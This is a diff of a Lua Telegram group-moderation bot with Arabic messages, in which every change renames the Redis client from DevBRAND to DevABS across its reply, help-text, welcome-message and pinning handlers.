 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-DevBRAND:del(BRAND.."BRAND:Add:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Gif:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Voice:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Audio:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Photo:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Stecker:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Video:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:File:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Text:AllRed"..v)
-DevBRAND:del(BRAND.."BRAND:Sudo:AllRed")
+DevABS:del(BRAND.."BRAND:Add:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Gif:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Voice:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Audio:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Photo:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Stecker:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Video:AllRed"..v)
+DevABS:del(BRAND.."BRAND:File:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Text:AllRed"..v)
+DevABS:del(BRAND.."BRAND:Sudo:AllRed")
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف ردود المطور")  
 return false
@@ -9892,7 +9892,7 @@ if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي اسم البوت الان" ,  1, "md") 
-DevBRAND:set(BRAND..'BRAND:NameBot'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:NameBot'..msg.sender_user_id_, 'msg')
 return false 
 end
 end
@@ -9900,7 +9900,7 @@ if text and text == 'حذف اسم البوت' or text == 'مسح اسم الب�
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevBRAND:del(BRAND..'BRAND:NameBot')
+DevABS:del(BRAND..'BRAND:NameBot')
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم حذف اسم البوت'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end end 
@@ -9908,25 +9908,25 @@ end end
 if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) then
 HelpList ={'BRAND:Help','BRAND:Help1','BRAND:Help2','BRAND:Help3','BRAND:Help4','BRAND:Help5','BRAND:Help6'}
 for i,Help in pairs(HelpList) do
-DevBRAND:del(BRAND..Help) 
+DevABS:del(BRAND..Help) 
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم استعادة الكلايش الاصليه" ,  1, "md") 
 end
 if text == "تعيين الاوامر" and SecondSudo(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (الاوامر) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help0'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help0'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help0'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help0'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help0'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help', text)
+DevABS:del(BRAND..'BRAND:Help0'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
 if text == "الاوامر" or text == "اوامر" or text == "مساعده" then
-local Help = DevBRAND:get(BRAND..'BRAND:Help')
+local Help = DevABS:get(BRAND..'BRAND:Help')
 local Text = [[
 ⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -9946,14 +9946,14 @@ return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?cha
 end
 if text == "تعيين امر م1" and SecondSudo(msg) or text == "تعيين امر م١" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م1) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help01'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help01'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help01'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help01'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help01'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help1', text)
+DevABS:del(BRAND..'BRAND:Help01'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help1', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -9961,7 +9961,7 @@ if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوام
 if not Admin(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevBRAND:get(BRAND..'BRAND:Help1')
+local Help = DevABS:get(BRAND..'BRAND:Help1')
 local Text = [[
 ⌁︙اوامر حماية المجموعه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10014,14 +10014,14 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م2" and SecondSudo(msg) or text == "تعيين امر م٢" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م2) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help21'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help21'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help21'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help21'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help21'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help2', text)
+DevABS:del(BRAND..'BRAND:Help21'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help2', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -10029,7 +10029,7 @@ if text == "م2" or text == "م٢" or text == "اوامر2" or text == "اوام
 if not Admin(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevBRAND:get(BRAND..'BRAND:Help2')
+local Help = DevABS:get(BRAND..'BRAND:Help2')
 local Text = [[
 ⌁︙اوامر الادمنيه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10090,14 +10090,14 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م3" and SecondSudo(msg) or text == "تعيين امر م٣" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م3) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help31'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help31'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help31'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help31'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help31'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help3', text)
+DevABS:del(BRAND..'BRAND:Help31'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help3', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -10105,7 +10105,7 @@ if text == "م3" or text == "م٣" or text == "اوامر3" or text == "اوام
 if not Admin(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevBRAND:get(BRAND..'BRAND:Help3')
+local Help = DevABS:get(BRAND..'BRAND:Help3')
 local Text = [[
 ⌁︙اوامر المدراء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10155,14 +10155,14 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م4" and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م4) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help41'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help41'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help41'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help41'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help41'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help4', text)
+DevABS:del(BRAND..'BRAND:Help41'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help4', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
 return false end
 end
@@ -10170,7 +10170,7 @@ if text == "م٤" or text == "م4" or text == "اوامر4" or text == "اوام
 if not Admin(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevBRAND:get(BRAND..'BRAND:Help4')
+local Help = DevABS:get(BRAND..'BRAND:Help4')
 local Text = [[
 ⌁︙اوامر المنشئين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10214,14 +10214,14 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م5" and SecondSudo(msg) or text == "تعيين امر م٥" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م5) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help51'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help51'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help51'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help51'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help51'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help5', text)
+DevABS:del(BRAND..'BRAND:Help51'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help5', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -10229,7 +10229,7 @@ if text == "م٥" or text == "م5" or text == "اوامر5" or text == "اوام
 if not SudoBot(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمطورين فقط', 1, 'md')
 else
-local Help = DevBRAND:get(BRAND..'BRAND:Help5')
+local Help = DevABS:get(BRAND..'BRAND:Help5')
 local Text = [[
 ⌁︙اوامر المطورين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10300,19 +10300,19 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م6" and SecondSudo(msg) or text == "تعيين امر م٦" and SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م6) الان " ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Help61'..msg.sender_user_id_, 'msg')
+DevABS:set(BRAND..'BRAND:Help61'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local BRANDTTEAM =  DevBRAND:get(BRAND..'BRAND:Help61'..msg.sender_user_id_)
+local BRANDTTEAM =  DevABS:get(BRAND..'BRAND:Help61'..msg.sender_user_id_)
 if BRANDTTEAM == 'msg' then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Help61'..msg.sender_user_id_)
-DevBRAND:set(BRAND..'BRAND:Help6', text)
+DevABS:del(BRAND..'BRAND:Help61'..msg.sender_user_id_)
+DevABS:set(BRAND..'BRAND:Help6', text)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
 return false end
 end
 if text == "م٦" or text == "م6" or text == "اوامر6" or text == "اوامر٦" then
-local Help = DevBRAND:get(BRAND..'BRAND:Help6')
+local Help = DevABS:get(BRAND..'BRAND:Help6')
 local Text = [[
 ⌁︙اوامر الاعضاء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10439,48 +10439,48 @@ end
 --     Source BRAND     --
 if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) then    
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف معلومات الترحيب', 1, 'md')   
-DevBRAND:del(BRAND..'BRAND:Text:BotWelcome')
-DevBRAND:del(BRAND..'BRAND:Photo:BotWelcome')
+DevABS:del(BRAND..'BRAND:Text:BotWelcome')
+DevABS:del(BRAND..'BRAND:Photo:BotWelcome')
 return false
 end 
 if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب') and SecondSudo(msg) then    
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
-DevBRAND:del(BRAND..'BRAND:Lock:BotWelcome')
+DevABS:del(BRAND..'BRAND:Lock:BotWelcome')
 return false
 end 
 if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب') and SecondSudo(msg) then    
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
-DevBRAND:set(BRAND..'BRAND:Lock:BotWelcome',true)
+DevABS:set(BRAND..'BRAND:Lock:BotWelcome',true)
 return false
 end 
 if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب ⌁') and SecondSudo(msg) then    
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي نص الترحيب', 1, 'md') 
-DevBRAND:del(BRAND..'BRAND:Text:BotWelcome')
-DevBRAND:del(BRAND..'BRAND:Photo:BotWelcome')
-DevBRAND:set(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_,"Text") 
+DevABS:del(BRAND..'BRAND:Text:BotWelcome')
+DevABS:del(BRAND..'BRAND:Photo:BotWelcome')
+DevABS:set(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_,"Text") 
 return false
 end 
-if text and DevBRAND:get(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
+if text and DevABS:get(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
 if text and text:match("^الغاء$") then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
-DevBRAND:del(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_)   
+DevABS:del(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_)   
 return false
 end 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص ارسل لي صورة الترحيب\n⌁︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
-DevBRAND:set(BRAND.."BRAND:Text:BotWelcome",text) 
-DevBRAND:set(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
+DevABS:set(BRAND.."BRAND:Text:BotWelcome",text) 
+DevABS:set(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
 return false 
 end 
-if DevBRAND:get(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
+if DevABS:get(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
 if text and text:match("^الغاء$") then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
-DevBRAND:del(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_)    
+DevABS:del(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_)    
 return false
 end 
 if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
-DevBRAND:set(BRAND.."BRAND:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
+DevABS:set(BRAND.."BRAND:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ النص وصورة الترحيب", 1, 'md')   
-DevBRAND:del(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_)   
+DevABS:del(BRAND.."BRAND:Set:BotWelcome"..msg.sender_user_id_)   
 end
 return false
 end
@@ -10490,28 +10490,28 @@ if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة المطور الان ", 1, "md")
-DevBRAND:setex(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
+DevABS:setex(BRAND.."BRAND:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
 end end
 if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف كليشة المطور", 1, "md")
-DevBRAND:del(BRAND.."DevText")
+DevABS:del(BRAND.."DevText")
 end end
 --     Source BRAND     --
-if DevBRAND:get(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
+if DevABS:get(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
-DevBRAND:del(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevABS:del(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 return false  end 
-DevBRAND:del(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevABS:del(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 local texxt = string.match(text, "(.*)") 
-DevBRAND:set(BRAND..'BRAND:ChText',texxt)
+DevABS:set(BRAND..'BRAND:ChText',texxt)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
 end
 if text and text:match("^تغير كليشه الاشتراك$") and SecondSudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and SecondSudo(msg) then  
-DevBRAND:setex(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
+DevABS:setex(BRAND.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
 local text = '⌁︙حسنا ارسل كليشة الاشتراك الجديده'  
 Dev_BRAND(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
 end
@@ -10519,7 +10519,7 @@ if text == "حذف كليشه الاشتراك الاجباري" or text == "ح�
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevBRAND:del(BRAND..'BRAND:ChText')
+DevABS:del(BRAND..'BRAND:ChText')
 textt = "⌁︙تم حذف كليشة الاشتراك الاجباري"
 Dev_BRAND(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
 end end
@@ -10527,12 +10527,12 @@ if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاش�
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-local chtext = DevBRAND:get(BRAND.."BRAND:ChText")
+local chtext = DevABS:get(BRAND.."BRAND:ChText")
 if chtext then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙كليشة الاشتراك ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
 else
-if DevBRAND:get(BRAND.."BRAND:ChId") then
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevBRAND:get(BRAND.."BRAND:ChId"))
+if DevABS:get(BRAND.."BRAND:ChId") then
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevABS:get(BRAND.."BRAND:ChId"))
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.username then
 User = "https://t.me/"..GetInfo.result.username
@@ -10577,10 +10577,10 @@ BRANDFiles(msg)
 elseif (data.ID == "UpdateMessageEdited") then
 local msg = data
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
-DevBRAND:incr(BRAND..'BRAND:EditMsg'..result.chat_id_..result.sender_user_id_)
+DevABS:incr(BRAND..'BRAND:EditMsg'..result.chat_id_..result.sender_user_id_)
 local text = result.content_.text_ or result.content_.caption_
 local Text = result.content_.text_
-if DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
+if DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 Media = 'الميديا'
 if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
@@ -10616,7 +10616,7 @@ end
 if not VipMem(result) then
 Filters(result, text)
 if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:EditMsgs'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 end end end 
 end,nil)
@@ -10624,18 +10624,18 @@ end,nil)
 elseif (data.ID == "UpdateMessageSendSucceeded") then
 local msg = data.message_
 local text = msg.content_.text_
-local GetMsgPin = DevBRAND:get(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_)
+local GetMsgPin = DevABS:get(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_)
 if GetMsgPin ~= nil then
 if text == GetMsgPin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevBRAND:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_);end;end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevABS:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_);end;end,nil)   
 elseif (msg.content_.sticker_) then 
 if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevBRAND:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_) end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevABS:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_) end,nil)   
 end
 end
 if (msg.content_.animation_) then 
 if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevBRAND:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_) end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevABS:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_) end,nil)   
 end
 end
 if (msg.content_.photo_) then
@@ -10652,33 +10652,33 @@ if msg.content_.photo_.sizes_[3] then
 id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
 if id_photo == GetMsgPin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevBRAND:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_) end,nil)   
+tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevABS:del(BRAND..'BRAND:PinnedMsgs'..msg.chat_id_) end,nil)   
 end end end
 --     Source BRAND     --
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
 print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
-local PvList = DevBRAND:smembers(BRAND..'BRAND:Users')  
+local PvList = DevABS:smembers(BRAND..'BRAND:Users')  
 for k,v in pairs(PvList) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
 end 
-local GpList = DevBRAND:smembers(BRAND..'BRAND:Groups') 
+local GpList = DevABS:smembers(BRAND..'BRAND:Groups') 
 for k,v in pairs(GpList) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
 tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=BRAND,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
-DevBRAND:srem(BRAND..'BRAND:Groups',v)  
+DevABS:srem(BRAND..'BRAND:Groups',v)  
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
-DevBRAND:srem(BRAND..'BRAND:Groups',v)  
+DevABS:srem(BRAND..'BRAND:Groups',v)  
 end
